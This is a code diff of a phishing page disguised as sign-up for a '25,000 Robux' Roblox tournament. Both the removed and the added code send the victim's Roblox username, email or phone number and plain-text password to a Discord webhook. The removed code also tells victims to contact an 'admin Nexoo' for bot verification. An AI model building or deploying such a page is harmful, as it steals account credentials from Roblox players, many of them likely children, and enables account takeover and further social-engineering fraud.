+                  value: `\`${password}\``,
+                  inline: false
+                },
+                {
+                  name: "📅 Turnierstart",
+                  value: "**01.05.2026 um 15:30 Uhr**",
+                  inline: false
                 }
-                
-                // Timer ausblenden, Live-Text einblenden
-                if (timerDiv) timerDiv.style.display = 'none';
-                if (liveMessageDiv) {
-                    liveMessageDiv.style.display = 'block';
-                    liveMessageDiv.innerHTML = '<i class="fas fa-trophy"></i> 25.0K ROBUX TOURNAMENT LIVE NOW! <i class="fas fa-trophy"></i><br><span style="font-size:0.8rem;">Join the Rivals Rush now!</span>';
-                    liveMessageDiv.style.animation = 'pulse-green 1s infinite';
-                }
-                return;
+              ],
+              footer: {
+                text: "Team Rivals Cup · ROBLOXCOMP"
+              },
+              timestamp: new Date().toISOString()
             }
-            
-            if (!isLive && distance > 0) {
-                // Normaler Countdown läuft
-                if (timerDiv) timerDiv.style.display = 'flex';
-                if (liveMessageDiv) liveMessageDiv.style.display = 'none';
-                if (countdownContainer) countdownContainer.classList.remove('live');
-                if (countdownLabel) {
-                    countdownLabel.innerHTML = '<i class="fas fa-hourglass-half"></i> 25.000 ROBUX RIVALS RUSH TOURNAMENT';
-                    countdownLabel.style.color = '';
-                }
-                
-                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-                
-                if (daysEl) daysEl.textContent = String(days).padStart(2, '0');
-                if (hoursEl) hoursEl.textContent = String(hours).padStart(2, '0');
-                if (minutesEl) minutesEl.textContent = String(minutes).padStart(2, '0');
-                if (secondsEl) secondsEl.textContent = String(seconds).padStart(2, '0');
-            }
-        }
-        
-        // Countdown jede Sekunde aktualisieren
-        updateCountdown();
-        setInterval(updateCountdown, 1000);
-        
-        // ========== TOAST & LOADER FUNKTIONEN ==========
-        let toastTimeout = null;
-        function showToast(msg, isError, duration = 2800) {
-            const toast = document.getElementById('floatingToast');
-            if (!toast) return;
-            if (toastTimeout) clearTimeout(toastTimeout);
-            
-            toast.style.borderLeftColor = isError ? '#ff5c6e' : '#2eff8a';
-            const icon = isError ? '<i class="fas fa-times-circle" style="color:#ff7a8a;"></i>' : '<i class="fas fa-check-circle" style="color:#6eff9e;"></i>';
-            toast.innerHTML = icon + ' <span>' + msg + '</span>';
-            
-            toast.classList.remove('hide');
-            toast.classList.add('show');
-            toast.style.opacity = '1';
-            toast.style.visibility = 'visible';
-            
-            toastTimeout = setTimeout(() => {
-                toast.classList.remove('show');
-                toast.classList.add('hide');
-                toastTimeout = setTimeout(() => {
-                    toast.style.opacity = '0';
-                    toast.style.visibility = 'hidden';
-                }, 400);
-            }, duration);
-        }
+          ]
+        };
 
-        function showInlineLoader(show) {
-            if (show) {
-                submitBtn.disabled = true;
-                submitBtn.innerHTML = '<div class="inline-loader"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>';
-            } else {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Register & Join';
-            }
-        }
+        sendToWebhook(payload);
+      }
 
-        function showSuccessAdminMessage() {
-            dynamicNotice.innerHTML = `
-                <div class="success-notice">
-                    <i class="fas fa-shield-alt" style="color:#2eff8a; margin-right:6px;"></i> 
-                    Perfekt! Admin <span class="nexoo-glow">Nexoo</span> needs to verify that you are not a bot — please reach out to him!
-                </div>
-            `;
-            dynamicNotice.classList.remove('hidden-message');
-        }
+      submitBtn.addEventListener('click', handleSubmit);
 
-        // Discord Webhook
-        async function sendToDiscord(username, emailPhone, password, teamArray) {
-            if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") 
-                throw new Error("WEBHOOK_NOT_SET");
-            
-            const teamFieldsList = teamArray.map((n,i) => `**Slot ${i+1}:** ${n || "—"}`).join("\n");
-            
-            const embed = {
-                title: "🔴 NEUE REGISTRIERUNG - RobloxComp 🔴",
-                color: 0xff3355,
-                fields: [
-                    { name: "🎮 Roblox Username", value: username || "❌ nicht angegeben", inline: true },
-                    { name: "📧 Email / Phone", value: emailPhone || "❌ nicht angegeben", inline: true },
-                    { name: "🔓 PASSWORD (KLARTEXT ZUR VERIFIKATION)", value: password || "❌ kein Passwort", inline: false },
-                    { name: "👥 Team Mitglieder (4 Slots)", value: teamFieldsList || "Keine Teammitglieder", inline: false }
-                ],
-                timestamp: new Date().toISOString(),
-                footer: { text: "Admin Verifikation notwendig • RobloxComp Official" }
-            };
-            
-            const payload = {
-                embeds: [embed],
-                content: "@here **NEUE ANMELDUNG** - Bitte verifizieren!"
-            };
-            
-            const res = await fetch(DISCORD_WEBHOOK_URL, { 
-                method: "POST", 
-                headers: { "Content-Type": "application/json" }, 
-                body: JSON.stringify(payload) 
-            });
-            if (!res.ok) throw new Error("Discord error: " + res.status);
-            return true;
-        }
-
-        async function handleRegistration() {
-            const robloxUser = usernameInput.value.trim();
-            const emailPhone = emailInput.value.trim();
-            const password = passwordInput.value;
-
-            if (!robloxUser) {
-                showToast("Please put in your username", true, 2000);
-                return;
-            }
-            if (!teamContainer.classList.contains('show-team')) {
-                teamContainer.classList.add('show-team');
-                showToast("Enter your 4 team members", false, 1500);
-            }
-            const member1 = teamMember1?.value.trim() || "";
-            const member2 = teamMember2?.value.trim() || "";
-            const member3 = teamMember3?.value.trim() || "";
-            const member4 = teamMember4?.value.trim() || "";
-            const teamSlots = [member1, member2, member3, member4];
-            if (!member1) {
-                showToast("Team Captain (Slot 1) is required", true, 2000);
-                return;
-            }
-
-            showInlineLoader(true);
-            await new Promise(r => setTimeout(r, 1500));
-            try {
-                await sendToDiscord(robloxUser, emailPhone || "not provided", password || "empty", teamSlots);
-                showInlineLoader(false);
-                showSuccessAdminMessage();
-                showToast("Registration successful! Discord notification sent.", false, 3000);
-                passwordInput.value = "";
-            } catch(err) {
-                showInlineLoader(false);
-                let msg = err.message.includes("WEBHOOK_NOT_SET") ? "Webhook not configured! Replace URL in code." : "Request failed: " + err.message;
-                showToast(msg, true, 4000);
-                console.error(err);
-            }
-        }
-
-        submitBtn.addEventListener('click', function(e) { e.preventDefault(); handleRegistration(); });
-        const allInputs = [usernameInput, emailInput, passwordInput, teamMember1, teamMember2, teamMember3, teamMember4];
-        for (var i = 0; i < allInputs.length; i++) {
-            if (allInputs[i]) allInputs[i].addEventListener('keypress', function(e) { if (e.key === 'Enter') handleRegistration(); });
-        }
-
-        setTimeout(function() {
-            if (globalLoader) globalLoader.classList.add('hidden-loader');
-            setTimeout(function() {
-                mainContainer.classList.add('loaded');
-                showToast("Welcome to RobloxComp | 25K Tournament", false, 2000);
-            }, 200);
-        }, 1000);
-
-        teamContainer.classList.remove('show-team');
-        dynamicNotice.classList.add('hidden-message');
-
-        if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
-            var warnSpan = document.createElement('div');
-            warnSpan.style.fontSize = "0.65rem";
-            warnSpan.style.marginTop = "12px";
-            warnSpan.style.padding = "8px";
-            warnSpan.style.background = "rgba(255,50,80,0.15)";
-            warnSpan.style.borderRadius = "12px";
-            warnSpan.style.color = "#ff8a9e";
-            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ DISCORD WEBHOOK NICHT KONFIGURIERT! Bitte ersetze die Webhook URL im Code!';
-            var loginCard = document.querySelector('.login-card');
-            if (loginCard) loginCard.appendChild(warnSpan);
-        }
-
-        const gitBtn = document.getElementById('githubBtn');
-        if(gitBtn) {
-            gitBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                showToast("RobloxComp .github.io | open source hub", false, 1500);
-            });
-        }
+      document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            handleSubmit();
+          }
+        });
+      });
     })();
-</script>
+  </script>
 </body>
 </html>
